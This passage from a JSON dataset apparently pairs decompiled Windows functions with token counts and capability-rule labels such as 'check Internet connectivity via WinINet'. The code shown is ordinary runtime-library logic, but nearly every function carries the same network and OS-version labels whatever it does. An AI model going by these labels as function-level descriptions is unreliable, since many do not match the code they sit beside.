        "decompiled_code": "\nuint __cdecl fcn.0040267b(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        iVar1 = *(in_ECX + 0x14);\n        *arg_8h = *(iVar1 + -8);\n        arg_8h[1] = *(iVar1 + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00405eed(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar4;\n        }\n        puVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        *arg_8h = *puVar3;\n        arg_8h[1] = puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 351
    },
    "004027e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004027e8(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    cVar1 = *arg_8h;\n    while ((cVar1 != '\\0' && (iVar2 != arg_ch))) {\n        iVar2 = iVar2 + 1;\n        cVar1 = arg_8h[iVar2];\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "0040281f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040281f(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    if ((((arg_8h != 0) && (arg_8h != 0x400)) && (arg_8h != 0x800)) &&\n       (((arg_ch != 0 || (arg_10h < 1)) && (-1 < arg_10h)))) {\n        iVar5 = 0;\n        iVar4 = 0xe3;\n        do {\n            iVar3 = (iVar4 + iVar5) / 2;\n            iVar1 = *(iVar3 * 8 + 0x554b10);\n            if (arg_8h == iVar1) goto code_r0x004db499;\n            if (arg_8h - iVar1 < 0) {\n                iVar4 = iVar3 + -1;\n            }\n            else {\n                iVar5 = iVar3 + 1;\n            }\n        } while (iVar5 <= iVar4);\n        iVar3 = -1;\ncode_r0x004db499:\n        if (-1 < iVar3) {\n            arg_8h_00 = *(iVar3 * 8 + 0x554b14);\n            iVar4 = fcn.00403e18(arg_8h_00, 0x55);\n            if (0 < arg_10h) {\n                if (arg_10h <= iVar4) {\n                    return 0;\n                }\n                iVar5 = fcn.004038dc(arg_ch, arg_10h, arg_8h_00);\n                if (iVar5 != 0) {\n                    fcn.004035f8(0, 0, 0, 0, 0);\n                    pcVar2 = swi(3);\n                    iVar4 = (*pcVar2)();\n                    return iVar4;\n                }\n            }\n            return iVar4 + 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 471
    },
    "00402824": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.00402824(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint *puVar3;\n    char cVar4;\n    uint uVar5;\n    uint noname_0;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_4h;\n    \n    fcn.0040536c(0x38);\n    iVar1 = *(unaff_EBP + 0x1c);\n    puVar2 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x44) = *(unaff_EBP + 8);\n    uVar5 = *(iVar1 + 0x30);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + 0x24);\n    fcn.0040327e(uVar5);\n    *(unaff_EBP + -4) = 0;\n    uVar5 = fcn.00401a6e(noname_0, unaff_EBP + -0x30, unaff_EBP + 0xc, unaff_EBP + 0x14, *(iVar1 + 0x14), \n                         unaff_EBP + -0x3c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004050a6();\n    if (*(unaff_EBP + -0x30) == '\\0') {\n        puVar3 = *(unaff_EBP + -0x34);\n        *puVar2 = 2;\n        *puVar3 = 0;\n    }\n    else {\n        uVar5 = fcn.00404214(unaff_EBP + -0x30, unaff_EBP + -0x40, uVar5, unaff_EBP + -0x38);\n        **(unaff_EBP + -0x34) = uVar5;\n        if ((*(unaff_EBP + -0x40) == unaff_EBP + -0x30) || (*(unaff_EBP + -0x38) != 0)) {\n            *puVar2 = 2;\n        }\n    }\n    cVar4 = fcn.00403f7b(unaff_EBP + 0x14);\n    if (cVar4 != '\\0') {\n        *puVar2 = *puVar2 | 1;\n    }\n    puVar3 = *(unaff_EBP + -0x44);\n    uVar5 = *(unaff_EBP + 0x10);\n    *puVar3 = *(unaff_EBP + 0xc);\n    puVar3[1] = uVar5;\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 698
    },
    "0040286f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040286f(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (**0x56f458 == '\\0') {\n        fcn.004017df(1);\n    }\n    else {\n        iVar1 = fcn.00406771(*0x56f458, \"??_C\", 4);\n        if (iVar1 != 0) {\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            *(arg_8h + 1) = 2;\n            return arg_8h;\n        }\n        *0x56f458 = *0x56f458 + 4;\n        fcn.004034db(arg_8h, 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 179
    },
    "0040288d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040288d(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    if (*arg_8h == 0) {\n        *arg_8h = arg_ch;\n        *(arg_8h + 1) = arg_10h;\n        arg_8h[3] = arg_14h;\n    }\n    else {\n        cVar1 = fcn.00401f00(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (cVar1 == '\\0') {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 200
    },
    "004028fb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004028fb(int32_t *arg_8h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        iVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            uVar3 = fcn.00403751();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00401190(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        iVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 343
    },
    "00402919": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00402919(char **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    char *pcVar3;\n    char **ppcVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint *arg_8h_00;\n    char *pcVar7;\n    uint *unaff_ESI;\n    char *pcVar8;\n    uint var_3ch;\n    uint var_34h;\n    char **var_2ch;\n    uint var_28h;\n    char *var_1dh;\n    char *var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    pcVar3 = *0x56f458;\n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_2ch = arg_8h;\n    var_1dh._0_1_ = **0x56f458;\n    if (var_1dh - 0x30U < 10) {\n        *0x56f458 = *0x56f458 + 1;\n        fcn.00401ee7(arg_8h, var_1dh - 0x30U);\n        goto code_r0x004913f6;\n    }\n    if (var_1dh == '?') {\n        ppcVar4 = fcn.00402c98(&var_28h, 0);\n        unique0x00007a00 = *ppcVar4;\n        var_18h = ppcVar4[1];\n        pcVar7 = var_18h;\n        pcVar8 = unique0x00007a00;\n        pcVar3 = *0x56f458 + 1;\n        if (**0x56f458 != '@') {\n            fcn.00402e8c((**0x56f458 != '\\0') + 1);\n            pcVar7 = var_18h;\n            pcVar8 = stack0xffffffe0;\n            pcVar3 = *0x56f458;\n        }\n    }\n    else {\n        iVar5 = fcn.004917cc(*0x56f458, \"template-parameter-\", 0x13);\n        if (iVar5 == 0) {\n            stack0xffffffe0 = \"`template-parameter-\";\n            *0x56f458 = pcVar3 + 0x13;\n            var_18h = 0x14;\ncode_r0x004912de:\n            fcn.0040622b(&var_28h);\n            if (((*0x56f460 & 0x4000) == 0) || (*0x56f468 == NULL)) {\n                fcn.00402cfc(&var_1dh + 1);\n                fcn.004052f9(&var_1dh + 1, &var_28h);\n                arg_8h_00 = &var_3ch;\n            }\n            else {\n                fcn.00403daa(&var_14h, 0x10);\n                pcVar2 = *0x56f468;\n                uVar6 = fcn.00406681(&var_14h);\n                (**0x573000)(uVar6);\n                iVar5 = (*pcVar2)();\n                if (iVar5 != 0) {\n                    var_18h = var_18h & 0xffffff00;\n                    ppcVar4 = fcn.00404c46(iVar5);\n                    goto code_r0x004913b6;\n                }\n                fcn.00402cfc(&var_1dh + 1);\n                unaff_ESI = &var_28h;\n                fcn.004052f9(&var_1dh + 1, unaff_ESI);\n                arg_8h_00 = &var_34h;\n            }\n            ppcVar4 = fcn.004032bf(arg_8h_00, 0x27);\n        }\n        else {\n            iVar5 = fcn.004917cc(pcVar3, \"generic-type-\", 0xd);\n            if (iVar5 == 0) {\n                stack0xffffffe0 = \"`generic-type-\";\n                *0x56f458 = pcVar3 + 0xd;\n                var_18h = 0xe;\n                goto code_r0x004912de;\n            }\n            if ((arg_10h != '\\0') && (var_1dh == '@')) {\n                pcVar8 = NULL;\n                pcVar7 = NULL;\n                pcVar3 = pcVar3 + 1;\n                goto code_r0x004913bb;\n            }\n            ppcVar4 = fcn.0040672b(0x56f458, 0x40);\n        }\ncode_r0x004913b6:\n        pcVar7 = ppcVar4[1];\n        pcVar8 = *ppcVar4;\n        pcVar3 = *0x56f458;\n    }\ncode_r0x004913bb:\n    *0x56f458 = pcVar3;\n    piVar1 = *0x56f450;\n    if (((arg_ch != '\\0') && (**0x56f450 != 9)) && (pcVar8 != NULL)) {\n        ppcVar4 = fcn.004051dc(8);\n        if (ppcVar4 != NULL) {\n            *ppcVar4 = pcVar8;\n            ppcVar4[1] = pcVar7;\n            *piVar1 = *piVar1 + 1;\n            piVar1[*piVar1 + 1] = ppcVar4;\n        }\n    }\n    *var_2ch = pcVar8;\n    var_2ch[1] = pcVar7;\ncode_r0x004913f6:\n    fcn.00403085(unaff_ESI);\n    return;\n}\n",
        "token_count": 1302
    },
    "00402937": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402937(uint arg_8h, uint32_t arg_ch, int32_t *arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        return;\n    }\n    piVar1 = *in_ECX;\n    if (piVar1[2] == piVar1[1]) {\n        if (*(piVar1 + 3) == '\\0') {\ncode_r0x004a79bb:\n            *arg_10h = -1;\n            return;\n        }\n    }\n    else {\n        uVar2 = piVar1[1] - piVar1[2];\n        if (arg_ch <= uVar2) {\n            uVar2 = arg_ch;\n        }\n        fcn.0040576d(*piVar1, arg_8h, uVar2 * 2);\n        **in_ECX = **in_ECX + uVar2 * 2;\n        (*in_ECX)[2] = (*in_ECX)[2] + uVar2;\n        if (*(*in_ECX + 3) == '\\0') {\n            if (uVar2 == arg_ch) {\n                *arg_10h = *arg_10h + uVar2;\n                return;\n            }\n            goto code_r0x004a79bb;\n        }\n    }\n    *arg_10h = *arg_10h + arg_ch;\n    return;\n}\n",
        "token_count": 339
    },
    "00402964": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00402964(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004057e5(arg_8h);\n    fcn.004df4e5(&var_ch, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h);\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "004029c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004029c8(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint32_t *puVar3;\n    uint32_t **ppuVar4;\n    uint32_t *puVar5;\n    uint32_t *puVar6;\n    uint var_4h;\n    \n    ppuVar4 = fcn.004067f8();\n    if (ppuVar4 == NULL) {\n        return 0;\n    }\n    puVar1 = *ppuVar4;\n    for (puVar6 = puVar1; puVar6 != puVar1 + 0x24; puVar6 = puVar6 + 3) {\n        if (*puVar6 == arg_8h) goto code_r0x004a84a8;\n    }\n    puVar6 = NULL;\ncode_r0x004a84a8:\n    if (puVar6 == NULL) {\n        return 0;\n    }\n    pcVar2 = puVar6[2];\n    if (pcVar2 == NULL) {\n        return 0;\n    }\n    if (pcVar2 == 0x5) {\n        puVar6[2] = 0;\n        return 1;\n    }\n    if (pcVar2 == 0x1) {\n        return 0xffffffff;\n    }\n    puVar3 = ppuVar4[1];\n    ppuVar4[1] = arg_ch;\n    if (puVar6[1] != 8) {\n        puVar6[2] = 0;\n        (**0x573000)(puVar6[1]);\n        (*pcVar2)();\n        goto code_r0x004a85b5;\n    }\n    for (puVar5 = puVar1 + 9; puVar5 != puVar1 + 0x24; puVar5 = puVar5 + 3) {\n        puVar5[2] = 0;\n    }\n    puVar1 = ppuVar4[2];\n    puVar5 = puVar1;\n    if (*puVar6 < 0xc0000092) {\n        if (*puVar6 == 0xc0000091) {\n            puVar5 = 0x84;\n        }\n        else if (*puVar6 == 0xc000008d) {\n            puVar5 = 0x82;\n        }\n        else if (*puVar6 == 0xc000008e) {\n            puVar5 = 0x83;\n        }\n        else if (*puVar6 == 0xc000008f) {\n            puVar5 = 0x86;\n        }\n        else {\n            if (*puVar6 != 0xc0000090) goto code_r0x004a8592;\n            puVar5 = 0x81;\n        }\ncode_r0x004a858f:\n        ppuVar4[2] = puVar5;\n    }\n    else {\n        if (*puVar6 == 0xc0000092) {\n            puVar5 = 0x8a;\n            goto code_r0x004a858f;\n        }\n        if (*puVar6 == 0xc0000093) {\n            puVar5 = 0x85;\n            goto code_r0x004a858f;\n        }\n        if (*puVar6 == 0xc00002b4) {\n            puVar5 = 0x8e;\n            goto code_r0x004a858f;\n        }\n        if (*puVar6 == 0xc00002b5) {\n            puVar5 = 0x8d;\n            goto code_r0x004a858f;\n        }\n    }\ncode_r0x004a8592:\n    (**0x573000)(8, puVar5);\n    (*pcVar2)();\n    ppuVar4[2] = puVar1;\ncode_r0x004a85b5:\n    ppuVar4[1] = puVar3;\n    return 0xffffffff;\n}\n",
        "token_count": 883
    },
    "004029e6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004029e6(int32_t *arg_8h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        iVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            uVar3 = fcn.00403751();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00403819(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        iVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 344
    },
    "004029fa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004029fa(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.004048e5(*(in_ECX + 0x10) + -1, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 355
    },
    "00402a3b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00402a3b(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    char *pcVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t iStack12;\n    uint uStack8;\n    \n    cVar4 = *(param_1 + 0x31);\n    if (cVar4 != 'F') {\n        if (cVar4 == 'N') {\n            if ((*param_1 & 8) != 0) {\n                return 1;\n            }\n            param_1[7] = 8;\n        }\n        else if (param_1[0xb] == 0) {\n            if (cVar4 < 'k') {\n                if (cVar4 == 'j') {\n                    param_1[0xb] = 5;\n                    return 1;\n                }\n                if (cVar4 == 'I') {\n                    pcVar1 = param_1[4];\n                    cVar4 = *pcVar1;\n                    if ((cVar4 == '3') && (pcVar1[1] == '2')) {\n                        param_1[0xb] = 10;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if ((cVar4 == '6') && (pcVar1[1] == '4')) {\n                        param_1[0xb] = 0xb;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if (((((cVar4 != 'd') && (cVar4 != 'i')) && (cVar4 != 'o')) && ((cVar4 != 'u' && (cVar4 != 'x'))))\n                       && (cVar4 != 'X')) {\n                        return 1;\n                    }\n                    param_1[0xb] = 9;\n                    return 1;\n                }\n                if (cVar4 == 'L') {\n                    param_1[0xb] = 8;\n                    return 1;\n                }\n                if (cVar4 == 'T') {\n                    param_1[0xb] = 0xd;\n                    return 1;\n                }\n                if (cVar4 != 'h') {\n                    return 1;\n                }\n                if (*param_1[4] == 'h') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 1;\n                }\n                else {\n                    uVar7 = 2;\n                }\n            }\n            else {\n                if (cVar4 != 'l') {\n                    if (cVar4 == 't') {\n                        param_1[0xb] = 7;\n                        return 1;\n                    }\n                    if (cVar4 == 'w') {\n                        param_1[0xb] = 0xc;\n                        return 1;\n                    }\n                    if (cVar4 == 'z') {\n                        param_1[0xb] = 6;\n                        return 1;\n                    }\n                    return 1;\n                }\n                if (*param_1[4] == 'l') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 4;\n                }\n                else {\n                    uVar7 = 3;\n                }\n            }\n            param_1[0xb] = uVar7;\n            return 1;\n        }\n        puVar6 = fcn.004039a4();\n        *puVar6 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    if ((*param_1 & 8) != 0) {\n        return 1;\n    }\n    param_1[7] = 7;\n    cVar4 = *(param_1 + 0x31);\n    uStack8 = param_1;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x0049e7d7:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x0049e7db:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x0049e7de:\n            cVar4 = fcn.00404af7(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x0049e783:\n                arg_8h = 0x10;\n                goto code_r0x0049e7de;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x0049e797;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x0049e76b;\n                }\n            }\ncode_r0x0049e7e7:\n            cVar4 = fcn.0040393b();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00401d07();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x0049e7e7;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x0049e797:\n            cVar4 = fcn.00401f5a(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.0040114a();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x0049e7e7;\n            if (cVar4 == 'i') goto code_r0x0049e7d7;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.00404421();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.004025ea();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x0049e783;\n            }\n            goto code_r0x0049e7db;\n        }\ncode_r0x0049e76b:\n        cVar4 = fcn.004020f4();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(param_1 + 0xc) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    uStack8 = (uStack8 >> 0x10 & 0xff00) << 0x10;\n    uVar7 = param_1[8];\n    iStack12 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        uStack8._1_3_ = uStack8 >> 8;\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack8 = CONCAT31(uStack8._1_3_, 0x20);\n                    arg_ch = 1;\n                    iStack12 = 1;\n                }\n                goto code_r0x0049e86d;\n            }\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2b);\n        }\n        else {\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2d);\n        }\n        iStack12 = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049e86d:\n    cVar4 = *(param_1 + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&uStack8 + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&uStack8 + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        iStack12 = arg_ch;\n    }\n    arg_14h = param_1 + 6;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00403cd3(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n        arg_ch = iStack12;\n    }\n    fcn.00405df8(&uStack8, arg_ch, arg_14h, param_1 + 3);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00403cd3(param_1 + 0x112, 0x30, arg_10h, arg_14h);\n    }\n    fcn.00404a7f(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00403cd3(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 2388
    },
    "00402a6d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00402a6d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    bool bVar3;\n    \n    iVar1 = *(param_1 + 0x458);\n    Var2 = iVar1 >> 8;\n    if (iVar1 == 1) {\n        bVar3 = *(param_1 + 0x45c) == 2;\n    }\n    else {\n        if (iVar1 != 2) goto code_r0x0049bc01;\n        bVar3 = *(param_1 + 0x45c) == 0;\n    }\n    if (bVar3) {\n        return CONCAT31(Var2, 1);\n    }\ncode_r0x0049bc01:\n    return Var2 << 8;\n}\n",
        "token_count": 182
    },
    "00402b21": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
